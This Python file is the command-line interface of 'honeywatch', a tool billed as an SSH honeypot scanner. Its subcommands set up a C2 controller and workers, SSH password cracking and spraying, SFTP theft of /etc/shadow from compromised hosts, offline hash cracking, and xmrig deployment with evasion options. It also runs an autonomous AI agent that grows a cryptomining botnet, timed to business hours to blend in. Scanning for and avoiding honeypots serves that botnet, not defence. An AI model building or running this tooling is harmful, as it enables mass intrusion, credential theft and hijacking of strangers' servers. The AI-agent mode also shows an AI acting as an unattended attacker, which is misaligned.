"""honeywatch command-line interface.

Subcommands:
    scan    run a port scan, probe SSH hosts and score honeypot confidence
    probe   fingerprint a single host
    report  write reports from the local store
    config  print or write the default configuration

All heavy imports (config, pipeline, store, report, models) are performed
lazily inside the subcommand handlers so ``--help`` works without optional
dependencies installed.
"""
from __future__ import annotations

import argparse
import asyncio
import inspect
import os
import sys
import time
from collections import Counter

from honeywatch.cmd_spray import _cmd_spray
from honeywatch.cmd_botnet import _cmd_botnet

__all__ = ["build_parser", "main"]


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="honeywatch",
        description="honeywatch: internet-scale SSH honeypot confidence scanner",
    )
    parser.add_argument(
        "--version",
        action="version",
        version=f"%(prog)s {_package_version()}",
    )
    sub = parser.add_subparsers(dest="command", metavar="COMMAND", required=True)

    # ------------------------------ scan ------------------------------
    p_scan = sub.add_parser(
        "scan", help="scan targets, probe SSH hosts and score honeypot confidence"
    )
    p_scan.add_argument(
        "targets",
        nargs="+",
        metavar="TARGET",
        help="target IPs/CIDRs, e.g. 192.0.2.0/24 198.51.100.7",
    )
    p_scan.add_argument(
        "--tool",
        choices=("masscan", "zmap"),
        default="masscan",
        help="port scanner to use (default: masscan)",
    )
    p_scan.add_argument(
        "--ports",
        default="22",
        help="comma-separated ports and ranges, e.g. 22 or 22,2200-2222 (default: 22)",
    )
    p_scan.add_argument(
        "--rate",
        type=int,
        default=None,
        help="scan rate in packets/sec (default: from config)",
    )
    p_scan.add_argument(
        "--concurrency",
        type=int,
        default=None,
        help="SSH probe concurrency (default: from config)",
    )
    p_scan.add_argument(
        "--timeout",
        type=float,
        default=None,
        help="SSH probe timeout in seconds (default: from config)",
    )
    p_scan.add_argument(
        "--probe-level",
        choices=("fast", "full"),
        default="fast",
        help="probe depth: fast banner grab or full handshake (default: fast)",
    )
    p_scan.add_argument(
        "--auth-probe",
        action="store_true",
        help="attempt an additional SSH auth probe",
    )
    p_scan.add_argument(
        "--no-ai", action="store_true", help="disable AI classification"
    )
    p_scan.add_argument(
        "--model", default=None, help="AI model name (default: from config)"
    )
    p_scan.add_argument(
        "--db", default=None, help="sqlite database path (default: from config)"
    )
    p_scan.add_argument(
        "--out-dir",
        default=None,
        help="directory for report files (default: from config)",
    )
    p_scan.add_argument(
        "--config", default=None, help="path to a honeywatch TOML config"
    )
    p_scan.add_argument(
        "--max-hosts",
        type=int,
        default=None,
        help="cap the number of hosts probed and scored",
    )
    p_scan.add_argument(
        "--interval",
        type=int,
        default=None,
        metavar="SECONDS",
        help="re-run the scan loop every N seconds until Ctrl-C",
    )
    p_scan.add_argument(
        "--report-format",
        nargs="+",
        default=None,
        metavar="FORMAT",
        help="report formats to write: json, csv, md (comma- or space-separated; default: all three)",
    )
    p_scan.add_argument(
        "--skip-vpn-check",
        action="store_true",
        help="bypass the Mullvad VPN gate (offline/controlled testing only)",
    )
    p_scan.add_argument(
        "--all-hosts",
        action="store_true",
        help="keep non-SSH hosts in results (debug; default filters to SSH only)",
    )
    p_scan.add_argument(
        "--resume",
        action="store_true",
        help="skip hosts already scored in the store (resume an interrupted scan)",
    )
    p_scan.add_argument(
        "--progress",
        action="store_true",
        help="print a live heartbeat as probes complete (long scans)",
    )
    p_scan.set_defaults(func=_cmd_scan)

    # ------------------------------ probe -----------------------------
    p_probe = sub.add_parser(
        "probe", help="fingerprint and classify a single SSH host"
    )
    p_probe.add_argument(
        "host", metavar="ip[:port]", help="host to probe; port defaults to 22"
    )
    p_probe.add_argument(
        "--config", default=None, help="path to a honeywatch TOML config"
    )
    p_probe.add_argument("--no-ai", action="store_true", help="disable AI classification")
    p_probe.add_argument("--model", default=None, help="AI model name (default: from config)")
    p_probe.add_argument(
        "--probe-level",
        choices=("fast", "full"),
        default=None,
        help="fingerprint depth (default: from config)",
    )
    p_probe.add_argument(
        "--skip-vpn-check",
        action="store_true",
        help="bypass the Mullvad VPN gate (offline/controlled testing only)",
    )
    p_probe.add_argument(
        "--json",
        action="store_true",
        help="emit the result as a single JSON object (machine-readable)",
    )
    p_probe.set_defaults(func=_cmd_probe)

    # ----------------------------- report -----------------------------
    p_report = sub.add_parser("report", help="write reports from the local store")
    p_report.add_argument("--db", default=None, help="sqlite database path")
    p_report.add_argument(
        "--format",
        choices=("json", "csv", "md"),
        default="json",
        help="report format (default: json)",
    )
    p_report.add_argument(
        "--top", type=int, default=20, help="number of scores to include (default: 20)"
    )
    p_report.add_argument(
        "--limit",
        dest="top",
        type=int,
        default=20,
        help="alias for --top (number of scores to include)",
    )
    p_report.add_argument(
        "--label",
        choices=("real", "likely_real", "uncertain", "likely_honeypot", "honeypot"),
        default=None,
        help="only include scores with this final label",
    )
    p_report.add_argument(
        "--min-confidence",
        type=float,
        default=0.0,
        help="only include scores with confidence >= this value (default: 0.0)",
    )
    p_report.add_argument(
        "--out",
        default=None,
        help="output file, or a directory to write into (default: <reports_dir>)",
    )
    p_report.add_argument(
        "--config", default=None, help="path to a honeywatch TOML config"
    )
    p_report.set_defaults(func=_cmd_report)

    # ----------------------------- config ------------------------------
    p_cfg = sub.add_parser("config", help="print or write the default configuration")
    p_cfg.add_argument(
        "--write",
        default=None,
        metavar="PATH",
        help="write the default config to PATH instead of stdout",
    )
    p_cfg.set_defaults(func=_cmd_config)

    # ----------------------------- stats ------------------------------
    p_stats = sub.add_parser("stats", help="print aggregate statistics from the local store")
    p_stats.add_argument("--db", default=None, help="sqlite database path")
    p_stats.add_argument(
        "--json",
        action="store_true",
        help="emit the stats as a JSON object (machine-readable)",
    )
    p_stats.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_stats.set_defaults(func=_cmd_stats)

    # ----------------------------- c2 ----------------------------------
    p_c2 = sub.add_parser("c2", help="start the C2 controller / dashboard")
    p_c2.add_argument("--host", default=None, help="bind host (default: from config)")
    p_c2.add_argument("--port", type=int, default=None, help="bind port (default: from config)")
    p_c2.add_argument("--tls-cert", default=None, help="TLS certificate path")
    p_c2.add_argument("--tls-key", default=None, help="TLS private key path")
    p_c2.add_argument("--db", default=None, help="SQLite database path (default: from config)")
    p_c2.add_argument(
        "--generate-certs",
        action="store_true",
        help="generate self-signed certs in ./certs before starting",
    )
    p_c2.add_argument(
        "--api-token",
        default=None,
        help="shared bearer secret; when set, every API + WS request must carry it",
    )
    p_c2.add_argument(
        "--skip-vpn-check",
        action="store_true",
        help="bypass the Mullvad VPN gate (offline/controlled testing only)",
    )
    p_c2.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_c2.set_defaults(func=_cmd_c2)

    # ----------------------------- worker --------------------------------
    p_worker = sub.add_parser("worker", help="start a C2 worker node")
    p_worker.add_argument(
        "--controller-url", default=None, help="controller URL (default: from config)"
    )
    p_worker.add_argument(
        "--categories",
        default=None,
        help="comma-separated payload categories this worker accepts",
    )
    p_worker.add_argument(
        "--exec-mode",
        choices=("dry_run", "local_simulate", "ssh"),
        default=None,
        help="how to execute task scripts (default: from config)",
    )
    p_worker.add_argument(
        "--poll-interval", type=float, default=None, help="seconds between poll/claim attempts"
    )
    p_worker.add_argument("--ssh-user", default=None, help="SSH user for ssh exec mode")
    p_worker.add_argument("--ssh-key", default=None, help="SSH private key path")
    p_worker.add_argument(
        "--api-token",
        default=None,
        help="shared bearer secret to authenticate to the controller",
    )
    p_worker.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_worker.set_defaults(func=_cmd_worker)

    # ----------------------------- deploy --------------------------------
    p_deploy = sub.add_parser("deploy", help="build and enqueue a payload deployment")
    p_deploy.add_argument("payload_id", help="payload to deploy, e.g. xmrig or metasploit")
    p_deploy.add_argument(
        "--target-label",
        choices=("real", "likely_real", "uncertain", "likely_honeypot", "honeypot"),
        default=None,
        help="only target hosts with this label",
    )
    p_deploy.add_argument("--min-confidence", type=float, default=None, help="minimum confidence")
    p_deploy.add_argument("--max-confidence", type=float, default=None, help="maximum confidence")
    p_deploy.add_argument("--limit", type=int, default=None, help="max targets")
    p_deploy.add_argument(
        "--target-file",
        default=None,
        help="file with ip[:port] lines (skip store selection)",
    )
    p_deploy.add_argument(
        "--var",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="payload variable, e.g. --var pool=stratum+tcp://... --var wallet=...",
    )
    p_deploy.add_argument(
        "--evasion",
        default=None,
        help="comma-separated evasion payloads to chain, e.g. upx,symbol_strip",
    )
    p_deploy.add_argument(
        "--exec-mode",
        choices=("dry_run", "local_simulate", "ssh"),
        default=None,
        help="override default worker exec mode (stored in operation manifest)",
    )
    p_deploy.add_argument("--ssh-user", default=None, help="SSH user for selected targets")
    p_deploy.add_argument("--ssh-key", default=None, help="SSH private key path")
    p_deploy.add_argument("--db", default=None, help="SQLite database path")
    p_deploy.add_argument(
        "--controller-url",
        default=None,
        help="controller URL; if set, enqueue via API instead of direct DB",
    )
    p_deploy.add_argument(
        "--dry-run",
        action="store_true",
        help="build and print the manifest without enqueueing",
    )
    p_deploy.add_argument(
        "--allow-unsafe-vars",
        action="store_true",
        help="accept payload variable values containing shell metacharacters "
             "(command substitution, sequencing, newlines) at your own risk",
    )
    p_deploy.add_argument(
        "--integrity",
        default=None,
        metavar="PATH",
        help="path to a {payload_id: sha256} TOML integrity manifest; the install "
             "scripts verify downloaded tarballs against these hashes",
    )
    p_deploy.add_argument(
        "--require-integrity",
        action="store_true",
        help="refuse to deploy any payload that has no pinned sha256 "
             "(closes the blind curl|tar|exec gap)",
    )
    p_deploy.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_deploy.add_argument(
        "--skip-vpn-check",
        action="store_true",
        help="bypass the Mullvad VPN gate",
    )
    p_deploy.set_defaults(func=_cmd_deploy)

    # ----------------------------- setup ---------------------------------
    p_setup = sub.add_parser("setup", help="configure the AI agent and default mining wallet")
    p_setup.add_argument(
        "--ollama-api-key",
        default=None,
        help="Ollama API key (will prompt securely if omitted)",
    )
    p_setup.add_argument(
        "--ollama-base-url",
        default=None,
        help="Ollama base URL (default: https://ollama.com/v1)",
    )
    p_setup.add_argument(
        "--ollama-model",
        default=None,
        help="Ollama model (default: llama3.1:8b)",
    )
    p_setup.add_argument(
        "--pool",
        default=None,
        help="default mining pool URL",
    )
    p_setup.add_argument(
        "--wallet",
        default=None,
        help="default wallet address",
    )
    p_setup.add_argument(
        "--pass",
        dest="pass_",
        default=None,
        help="default pool password / worker identifier",
    )
    p_setup.add_argument(
        "--worker",
        default=None,
        help="default worker name",
    )
    p_setup.add_argument(
        "--tls",
        action="store_true",
        help="use TLS for pool connections by default",
    )
    p_setup.add_argument("--db", default="honeywatch.db", help="SQLite database path")
    p_setup.add_argument(
        "--check-tools",
        action="store_true",
        help="only check external tool availability (skip wizard)",
    )
    p_setup.set_defaults(func=_cmd_setup)

    # ----------------------------- chat ----------------------------------
    p_chat = sub.add_parser("chat", help="talk to the honeywatch AI agent")
    p_chat.add_argument(
        "--prompt",
        default=None,
        help="single prompt to send; omit for interactive mode",
    )
    p_chat.add_argument(
        "--db",
        default="honeywatch.db",
        help="SQLite database path (default: honeywatch.db)",
    )
    p_chat.add_argument(
        "--skip-vpn-check",
        action="store_true",
        help="bypass the Mullvad VPN gate for network tools",
    )
    p_chat.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_chat.set_defaults(func=_cmd_chat)

    # ----------------------------- agent --------------------------------
    p_agent = sub.add_parser(
        "agent",
        help="run the AI agent autonomously -- self-driving botnet (unattended)",
    )
    p_agent.add_argument(
        "--goal",
        default=None,
        help="mission goal (default: grow the xmrig fleet autonomously)",
    )
    p_agent.add_argument(
        "--max-cycles", type=int, default=20,
        help="autonomous decision cycles (default 20; 0 = forever until DONE/stall)",
    )
    p_agent.add_argument(
        "--cycle-delay", type=float, default=0.0,
        help="seconds to sleep between cycles (opsec cooldown)",
    )
    p_agent.add_argument(
        "--business-hours", action="store_true",
        help="only act inside 08:00-18:00 local weekdays; sleep otherwise",
    )
    p_agent.add_argument(
        "--log", default=None,
        help="append-only run log path (lets it run unattended / daemonized)",
    )
    p_agent.add_argument(
        "--db", default="honeywatch.db",
        help="SQLite database path (default: honeywatch.db)",
    )
    p_agent.add_argument(
        "--skip-vpn-check", action="store_true",
        help="bypass the Mullvad VPN gate for network tools",
    )
    p_agent.add_argument("--json", action="store_true", help="print the final summary as JSON")
    p_agent.set_defaults(func=_cmd_agent)

    # ----------------------------- crack ---------------------------------
    p_crack = sub.add_parser(
        "crack",
        help="online SSH password cracking against one or more hosts",
    )
    p_crack.add_argument(
        "targets",
        nargs="*",
        metavar="HOST",
        help="ip[:port] hosts to crack; use --target-file for a list",
    )
    p_crack.add_argument(
        "--target-file",
        default=None,
        help="file with ip[:port] lines (one per line; # comments ok)",
    )
    p_crack.add_argument(
        "--target-label",
        choices=("real", "likely_real", "uncertain", "likely_honeypot", "honeypot"),
        default=None,
        help="pull targets from the store by final label instead of passing hosts",
    )
    p_crack.add_argument(
        "--min-confidence",
        type=float,
        default=None,
        help="minimum final confidence when pulling targets from the store",
    )
    p_crack.add_argument("--limit", type=int, default=None, help="max targets from the store")
    p_crack.add_argument(
        "--users",
        default=None,
        help="comma-separated usernames to try (default: built-in population)",
    )
    p_crack.add_argument(
        "--user",
        default=None,
        help="single username to pin for all hosts (overrides --users)",
    )
    p_crack.add_argument(
        "--wordlist",
        default=None,
        help="path to a newline-separated password wordlist (default: bundled wordlist)",
    )
    p_crack.add_argument(
        "--passwords",
        default=None,
        help="comma-separated passwords to try (bypasses wordlist/mutations)",
    )
    p_crack.add_argument(
        "--no-mutations",
        action="store_true",
        help="try wordlist entries verbatim, without case/year/suffix mutations",
    )
    p_crack.add_argument(
        "--concurrency",
        type=int,
        default=None,
        help="parallel login attempts per host (default: from config)",
    )
    p_crack.add_argument(
        "--host-concurrency",
        type=int,
        default=None,
        help="max hosts attacked at once (default: from config)",
    )
    p_crack.add_argument(
        "--timeout",
        type=float,
        default=None,
        help="seconds per login attempt (default: from config)",
    )
    p_crack.add_argument(
        "--max-attempts",
        type=int,
        default=None,
        help="cap guesses per host before giving up (default: unbounded)",
    )
    p_crack.add_argument(
        "--no-stop-on-success",
        action="store_true",
        help="keep trying after a success (coverage/audit mode)",
    )
    p_crack.add_argument(
        "--no-save",
        action="store_true",
        help="do not persist cracked credentials to the store",
    )
    p_crack.add_argument(
        "--json",
        action="store_true",
        help="emit results as a single JSON object",
    )
    p_crack.add_argument("--db", default=None, help="SQLite database path")
    p_crack.add_argument(
        "--skip-vpn-check",
        action="store_true",
        help="bypass the Mullvad VPN gate",
    )
    p_crack.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_crack.set_defaults(func=_cmd_crack)

    # ----------------------------- creds ---------------------------------
    p_creds = sub.add_parser(
        "creds",
        help="list cracked SSH credentials stored by `crack`",
    )
    p_creds.add_argument("--ip", default=None, help="filter by host ip")
    p_creds.add_argument("--port", type=int, default=None, help="filter by port")
    p_creds.add_argument("--user", default=None, help="filter by username")
    p_creds.add_argument("--limit", type=int, default=100, help="max rows (default 100)")
    p_creds.add_argument(
        "--json",
        action="store_true",
        help="emit results as a JSON array",
    )
    p_creds.add_argument("--db", default=None, help="SQLite database path")
    p_creds.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_creds.set_defaults(func=_cmd_creds)

    # ----------------------------- hashcrack -----------------------------
    p_hash = sub.add_parser(
        "hashcrack",
        help="offline hash cracking of /etc/shadow with hashcat or john",
    )
    p_hash.add_argument("shadow", help="path to an /etc/shadow file (or a stash dir)")
    p_hash.add_argument("--passwd", default=None, help="optional /etc/passwd companion file")
    p_hash.add_argument("--wordlist", default=None, help="password wordlist for the attack (default: bundled wordlist)")
    p_hash.add_argument(
        "--tool", choices=("hashcat", "john"), default="hashcat",
        help="cracker binary (default hashcat)"
    )
    p_hash.add_argument("--bin", default=None, help="path to the hashcat/john binary")
    p_hash.add_argument("--mode", type=int, default=None, help="hashcat -m mode override")
    p_hash.add_argument(
        "--extra-args", default=None,
        help="extra args passed through to the cracker (shell-split)"
    )
    p_hash.add_argument("--timeout", type=float, default=None, help="seconds to bound the cracker run")
    p_hash.add_argument(
        "--ip", default=None,
        help="record cracked passwords against this host ip in the store"
    )
    p_hash.add_argument("--port", type=int, default=22, help="host port when recording creds")
    p_hash.add_argument("--no-save", action="store_true", help="do not persist cracked passwords to the store")
    p_hash.add_argument("--json", action="store_true", help="emit results as a JSON object")
    p_hash.add_argument("--db", default=None, help="SQLite database path")
    p_hash.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_hash.set_defaults(func=_cmd_hashcrack)

    # ------------------------------- grab --------------------------------
    p_grab = sub.add_parser(
        "grab",
        help="SFTP-exfil /etc/shadow from a popped host using cracked creds",
    )
    p_grab.add_argument("host", metavar="ip[:port]", help="host to exfil from")
    p_grab.add_argument("--user", default=None, help="SSH user (default: from credentials store)")
    p_grab.add_argument("--pass", dest="pass_", default=None, help="SSH password (default: from store)")
    p_grab.add_argument("--key", default=None, help="SSH private key path (overrides password)")
    p_grab.add_argument("--stash", default=None, help="local stash dir (default .honeywatch/shadow_stash)")
    p_grab.add_argument("--timeout", type=float, default=None, help="seconds for the SSH connect")
    p_grab.add_argument("--json", action="store_true", help="emit results as a JSON object")
    p_grab.add_argument("--db", default=None, help="SQLite database path")
    p_grab.add_argument(
        "--skip-vpn-check", action="store_true", help="bypass the Mullvad VPN gate"
    )
    p_grab.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_grab.set_defaults(func=_cmd_grab)

    # ------------------------------ spray -------------------------------
    p_spray = sub.add_parser(
        "spray",
        help="lockout-aware password spraying (one password across many users)",
    )
    p_spray.add_argument("targets", nargs="*", metavar="HOST", help="ip[:port] hosts to spray")
    p_spray.add_argument("--target-file", default=None, help="file with ip[:port] lines")
    p_spray.add_argument(
        "--target-label", default=None,
        choices=("real", "likely_real", "uncertain", "likely_honeypot", "honeypot"),
        help="pull hosts from the store by final label",
    )
    p_spray.add_argument("--min-confidence", type=float, default=None)
    p_spray.add_argument("--limit", type=int, default=None)
    p_spray.add_argument("--users", default=None, help="comma-separated usernames to spray")
    p_spray.add_argument("--user-file", default=None, help="file with usernames (one per line)")
    p_spray.add_argument(
        "--passwords", default=None,
        help="comma-separated passwords to spray (one round each, lockout-safe)",
    )
    p_spray.add_argument("--password-file", default=None, help="file with passwords (one per line)")
    p_spray.add_argument(
        "--reuse-creds", action="store_true",
        help="spray every credential already in the store across every discovered host (fleet reuse)",
    )
    p_spray.add_argument("--delay", type=float, default=0.0, help="seconds between guesses per host (default 0)")
    p_spray.add_argument("--jitter", type=float, default=0.5, help="random extra delay up to this many seconds (default 0.5)")
    p_spray.add_argument(
        "--lockout-delay", type=float, default=0.0,
        help="extra delay when a guess looks like a lockout/ban",
    )
    p_spray.add_argument(
        "--business-hours", action="store_true",
        help="only spray inside 08:00-18:00 local (blend with organic logins)",
    )
    p_spray.add_argument(
        "--no-precheck", action="store_true",
        help="skip the auth-method precheck (spray even publickey-only hosts)",
    )
    p_spray.add_argument("--proxy-file", default=None, help="file of socks5://[user:pass@]host:port proxies to round-robin")
    p_spray.add_argument("--jump-file", default=None, help="file of user@host SSH jumps to round-robin")
    p_spray.add_argument("--host-concurrency", type=int, default=8, help="hosts sprayed in parallel (default 8)")
    p_spray.add_argument("--no-save", action="store_true", help="do not persist recovered creds")
    p_spray.add_argument("--json", action="store_true", help="emit results as a JSON array")
    p_spray.add_argument("--db", default=None, help="SQLite database path")
    p_spray.add_argument("--skip-vpn-check", action="store_true", help="bypass the Mullvad VPN gate")
    p_spray.add_argument("--config", default=None, help="path to a honeywatch TOML config")
    p_spray.set_defaults(func=_cmd_spray)

    # ----------------------------- botnet -------------------------------
    p_net = sub.add_parser(
        "botnet",
        help="run the autonomous scan->spray->crack->deploy->pivot chain",
    )
    p_net.add_argument("targets", nargs="*", metavar="TARGET", help="CIDRs/IPs for the recon phase")
    p_net.add_argument("--scan-tool", choices=("masscan", "zmap"), default="masscan")
    p_net.add_argument("--scan-rate", type=int, default=None)
    p_net.add_argument("--max-hosts", type=int, default=None)
    p_net.add_argument("--users", default=None, help="comma-separated usernames to spray")
    p_net.add_argument("--user-file", default=None, help="username list file")
    p_net.add_argument("--passwords", default=None, help="comma-separated passwords to spray")
    p_net.add_argument("--password-file", default=None, help="password list file")
    p_net.add_argument("--payload", default="xmrig", help="payload to deploy (default xmrig)")
    p_net.add_argument("--pool", default=None, help="mining pool URL")
    p_net.add_argument("--wallet", default=None, help="wallet address")
    p_net.add_argument("--worker", default=None, help="worker name")
    p_net.add_argument("--threads", type=int, default=0)
    p_net.add_argument("--tls", action="store_true")
    p_net.add_argument("--evasion", default=None, help="comma-separated evasion payload ids")
    p_net.add_argument("--hashcrack-wordlist", default=None, help="wordlist for offline /etc/shadow cracking")
    p_net.add_argument("--hashcrack-tool", choices=("hashcat", "john"), default="hashcat")
    p_net.add_argument("--business-hours", action="store_true", help="only act inside 08:00-18:00 local")
    p_net.add_argument("--proxy-file", default=None, help="socks5:// pool to round-robin")
    p_net.add_argument("--jump-file", default=None, help="user@host SSH jumps to round-robin")
    p_net.add_argument("--delay", type=float, default=0.0)
    p_net.add_argument("--jitter", type=float, default=0.5)
    p_net.add_argument("--lockout-delay", type=float, default=0.0)
    p_net.add_argument("--host-concurrency", type=int, default=8)
    p_net.add_argument("--min-confidence", type=float, default=0.7)
    p_net.add_argument("--max-rounds", type=int, default=3,
                       help="pivot loops (default 3; 0 = run forever until growth exhausts)")
    p_net.add_argument("--shadow-stash", default=".honeywatch/shadow_stash")
    p_net.add_argument("--config", default=None,
                       help="config TOML path; recon honors its scan tuning (ports, AI, scanner opts)")
    p_net.add_argument("--db", default=None, help="SQLite database path")
    p_net.add_argument("--skip-vpn-check", action="store_true")
    p_net.add_argument("--json", action="store_true")
    p_net.set_defaults(func=_cmd_botnet)

    return parser


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def _package_version() -> str:
    """Read the installed package version, falling back to the in-tree constant."""
    try:
        from importlib.metadata import version

        return version("honeywatch")
    except Exception:
        return "0.1.0"


def _set(obj, name, value):
    """Best-effort attribute assignment (tolerates frozen/read-only configs)."""
    try:
        setattr(obj, name, value)
    except Exception:
        pass


def _maybe_await(value):
    """Await a coroutine/awaitable; pass plain values straight through."""
    if inspect.isawaitable(value):
        return asyncio.run(value)
    return value


def _match_signature(func, candidates: dict) -> dict:
    """Filter candidate kwargs down to those the callable actually accepts."""
    try:
        sig = inspect.signature(func)
    except (TypeError, ValueError):
        return {}
    accepts_all = any(
        p.kind is inspect.Parameter.VAR_KEYWORD for p in sig.parameters.values()
    )
    names = {
        p.name
        for p in sig.parameters.values()
        if p.kind in (inspect.Parameter.POSITIONAL_OR_KEYWORD, inspect.Parameter.KEYWORD_ONLY)
    }
    if accepts_all:
        return {k: v for k, v in candidates.items() if v is not None}
    return {k: v for k, v in candidates.items() if k in names and v is not None}


def parse_host(spec: str, default_port: int = 22):
    """Parse 'ip', 'ip:port', '[v6]:port' into (ip, port)."""
    spec = (spec or "").strip()
    if not spec:
        raise SystemExit("honeywatch: empty host specification")
    if spec.startswith("["):
        end = spec.find("]")
        if end != -1:
            ip = spec[1:end]
            rest = spec[end + 1 :]
            port = default_port
            if rest.startswith(":"):
                port_str = rest[1:]
                if port_str and not port_str.isdigit():
                    raise SystemExit(f"honeywatch: invalid port {port_str!r} in host spec {spec!r}")
                try:
                    port = int(port_str) if port_str else default_port
                except ValueError:
                    pass
            return ip, port
    if spec.count(":") == 1:
        host, _, port_str = spec.partition(":")
        if port_str:
            if not port_str.isdigit():
                raise SystemExit(f"honeywatch: invalid port {port_str!r} in host spec {spec!r}")
            return host, int(port_str)
    return spec, default_port


def parse_ports(spec: str) -> list:
    """Parse '22' / '22,80,443' / '2200-2222' into a de-duplicated port list."""
    ports = []
    for part in (spec or "22").split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            lo_s, _, hi_s = part.partition("-")
            try:
                lo, hi = int(lo_s), int(hi_s)
            except ValueError:
                raise SystemExit(
                    f"honeywatch: invalid port range {part!r}; expected N-M"
                )
            if hi < lo:
                lo, hi = hi, lo
            ports.extend(range(lo, hi + 1))
        else:
            try:
                ports.append(int(part))
            except ValueError:
                raise SystemExit(
                    f"honeywatch: invalid port {part!r}; must be an integer"
                )
    seen, result = set(), []
    for p in ports:
        if not (0 <= p <= 65535):
            raise SystemExit(
                f"honeywatch: invalid port {p}; must be 0-65535"
            )
        if p not in seen:
            seen.add(p)
            result.append(p)
    return result


def _toml_dumps(data: dict) -> str:
    """Minimal TOML serializer for the default config dict."""

    def fmt(v):
        if isinstance(v, bool):
            return "true" if v else "false"
        if v is None:
            return '""'
        if isinstance(v, str):
            return '"' + v.replace("\\", "\\\\").replace('"', '\\"') + '"'
        if isinstance(v, (int, float)):
            return str(v)
        if isinstance(v, (list, tuple)):
            return "[" + ", ".join(fmt(i) for i in v) + "]"
        if isinstance(v, dict):
            return "{ " + ", ".join(f"{k} = {fmt(x)}" for k, x in v.items()) + " }"
        return str(v)

    lines = []

    def emit(prefix: str, obj: dict) -> None:
        for key, value in obj.items():
            if isinstance(value, dict):
                table = f"{prefix}{key}" if prefix else key
                lines.append("")
                lines.append(f"[{table}]")
                emit(table + ".", value)
            else:
                lines.append(f"{key} = {fmt(value)}")

    emit("", data)
    return "\n".join(lines).strip() + "\n"



# ---------------------------------------------------------------------------
# subcommand handlers
# ---------------------------------------------------------------------------

def _cmd_config(args, argv) -> int:
    from honeywatch.config import default_config, write_example

    if args.write:
        write_example(args.write)
        print(f"wrote default configuration to {args.write}")
        return 0
    sys.stdout.write(_toml_dumps(default_config()))
    return 0


def _enforce_vpn(cfg, skip_vpn_check: bool) -> bool:
    """Return True when a network subcommand may proceed.

    The Mullvad VPN gate is enforced unless the user passed ``--skip-vpn-check``
    or set ``vpn.required = false`` in the config. Prints a refusal and returns
    False otherwise.
    """
    from honeywatch.vpn import DEFAULT_TIMEOUT, require_mullvad

    vpn_cfg = getattr(cfg, "vpn", None)
    required = bool(getattr(vpn_cfg, "required", True)) if vpn_cfg else True
    if skip_vpn_check or not required:
        return True
    timeout = (
        getattr(vpn_cfg, "timeout_s", DEFAULT_TIMEOUT) if vpn_cfg else DEFAULT_TIMEOUT
    )
    return require_mullvad(timeout=timeout)


def _cmd_probe(args, argv) -> int:
    from honeywatch.config import load_config
    from honeywatch.models import HostHit
    from honeywatch.pipeline import Pipeline

    cfg = load_config(args.config)
    if not _enforce_vpn(cfg, args.skip_vpn_check):
        return 2
    if args.model is not None:
        _set(cfg.ai, "model", args.model)
    if args.no_ai:
        _set(cfg.ai, "enabled", False)
    if args.probe_level is not None:
        _set(cfg.probe, "level", args.probe_level)

    ip, port = parse_host(args.host)
    pipeline = Pipeline(cfg)
    host = HostHit(ip=ip, port=port)
    fingerprints = _maybe_await(pipeline.probe_hosts([host]))
    if not fingerprints:
        import json as _json
        if args.json:
            print(_json.dumps({"ip": ip, "port": port, "scored": False, "error": "unreachable-or-non-ssh"}))
        else:
            print(f"no fingerprint captured for {ip}:{port} (host unreachable or non-SSH)")
        return 0
    scores = _maybe_await(pipeline.analyze_and_score(fingerprints))
    if scores:
        if args.json:
            _print_probe_json(scores[0])
        else:
            _print_probe(scores[0])
    else:
        fp = fingerprints[0]
        if args.json:
            import json as _json
            print(_json.dumps({"ip": ip, "port": port, "scored": False, "error": fp.error or ""}))
        else:
            print(f"captured fingerprint for {ip}:{port} but no score could be computed")
            if fp.error:
                print(f"  error: {fp.error}")
    return 0


def _print_probe(s) -> None:
    fp = s.fingerprint
    sig = s.signals
    ai = s.ai
    print(f"host:      {s.ip}:{s.port}")
    if fp:
        print(f"banner:    {fp.banner}")
        print(f"protocol:  {fp.protocol}")
        print(f"software:  {fp.software}")
        print(f"version:   {fp.software_version}")
        if fp.host_key_type or fp.host_key_sha256:
            print(f"host key:  {fp.host_key_type} {fp.host_key_sha256 or ''}".rstrip())
        if fp.error:
            print(f"error:     {fp.error}")
    if sig:
        if sig.flags:
            print(f"flags:     {', '.join(sig.flags)}")
        if sig.anomalies:
            print(f"anomalies: {', '.join(sig.anomalies)}")
        print(f"heuristic: {sig.heuristic_score:.3f}")
    if ai:
        print(f"ai:        {ai.classification} (confidence {ai.confidence:.3f})")
        if ai.model:
            print(f"model:     {ai.model}")
        for reason in ai.reasons:
            print(f"  - {reason}")
    print(f"final:     {s.final_label} (confidence {s.final_confidence:.3f})")


def _score_to_jsonable(s) -> dict:
    """Flat JSON-safe dict for `probe --json` (one host)."""
    from dataclasses import asdict
    fp = s.fingerprint
    sig = s.signals
    ai = s.ai
    return {
        "ip": s.ip,
        "port": s.port,
        "banner": fp.banner if fp else None,
        "protocol": fp.protocol if fp else None,
        "software": fp.software if fp else None,
        "version": fp.software_version if fp else None,
        "host_key_type": fp.host_key_type if fp else None,
        "host_key_sha256": fp.host_key_sha256 if fp else None,
        "flags": list(sig.flags) if sig else [],
        "anomalies": list(sig.anomalies) if sig else [],
        "heuristic_score": sig.heuristic_score if sig else 0.0,
        "ai": (
            {
                "classification": ai.classification,
                "confidence": ai.confidence,
                "model": ai.model,
                "reasons": list(ai.reasons),
            }
            if ai else None
        ),
        "final_label": s.final_label,
        "final_confidence": s.final_confidence,
        "error": fp.error if fp else None,
    }


def _print_probe_json(s) -> None:
    import json as _json
    print(_json.dumps(_score_to_jsonable(s), indent=2, default=str))


def _cmd_report(args, argv) -> int:
    from honeywatch.config import load_config
    from honeywatch.report import write_csv, write_json, write_md
    from honeywatch.store import Store

    cfg = load_config(args.config)
    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
    store = Store(db_path)
    rows = store.query_scores(
        limit=args.top, label=args.label, min_confidence=args.min_confidence
    )

